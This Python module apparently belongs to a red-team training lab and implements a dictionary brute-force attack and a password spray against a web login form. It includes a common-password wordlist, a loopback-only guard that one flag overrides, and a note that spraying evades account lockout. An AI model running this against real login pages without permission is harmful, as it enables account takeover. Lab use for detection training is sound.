"""Brute-force + password-spray module (Red Team).

⚠️ ETHICS: only run against targets you OWN / are authorized to test. By default this refuses
any non-loopback target; pass authorized=True (CLI: --i-am-authorized) to override for a host
you control. It performs *credential testing* against a login form and reports each attempt to
the SOC as an `auth_attempt` event — it never exfiltrates data.
"""
import ipaddress
from typing import Dict, List, Optional
from urllib.parse import urlparse

import requests

# A tiny demo wordlist. The lab seeds admin/s3cr3t, so "s3cr3t" produces a hit.
COMMON_PASSWORDS = [
    "123456", "password", "admin", "letmein", "qwerty",
    "s3cr3t", "hunter2", "root", "toor", "welcome",
]


def _is_loopback(url: str) -> bool:
    host = urlparse(url).hostname or ""
    if host in ("localhost", "localhost.localdomain"):
        return True
    try:
        return ipaddress.ip_address(host).is_loopback
    except ValueError:
        return False


def _guard(login_url: str, authorized: bool) -> None:
    if not _is_loopback(login_url) and not authorized:
        raise PermissionError(
            f"Refusing to brute-force non-loopback target {login_url!r} without authorization "
            "(pass --i-am-authorized only for hosts you own / are authorized to test)."
        )


def _attempt(login_url: str, username: str, password: str, timeout: float = 5.0) -> bool:
    """One login attempt; success == HTTP 200 (the lab returns 200 only on valid creds)."""
    try:
        r = requests.post(
            login_url, data={"username": username, "password": password}, timeout=timeout
        )
    except requests.RequestException:
        return False
    return r.status_code == 200


def _event(login_url: str, username: str, success: bool, attempt: int, total: int) -> Dict:
    return {
        "event_type": "auth_attempt",
        "data": {
            "target": login_url,
            "username": username,
            "success": success,
            "attempt": attempt,
            "total": total,
        },
    }


def scan(
    login_url: str,
    username: str,
    wordlist: Optional[List[str]] = None,
    authorized: bool = False,
    timeout: float = 5.0,
) -> List[Dict]:
    """Dictionary attack: try each password for one username; stops at the first success."""
    _guard(login_url, authorized)
    wordlist = wordlist or COMMON_PASSWORDS
    events: List[Dict] = []
    for i, password in enumerate(wordlist, 1):
        ok = _attempt(login_url, username, password, timeout)
        events.append(_event(login_url, username, ok, i, len(wordlist)))
        if ok:
            break
    return events


def spray(
    login_url: str,
    usernames: List[str],
    password: str,
    authorized: bool = False,
    timeout: float = 5.0,
) -> List[Dict]:
    """Password spray: try ONE password across many usernames (evades per-account lockout)."""
    _guard(login_url, authorized)
    events: List[Dict] = []
    for i, username in enumerate(usernames, 1):
        ok = _attempt(login_url, username, password, timeout)
        events.append(_event(login_url, username, ok, i, len(usernames)))
    return events
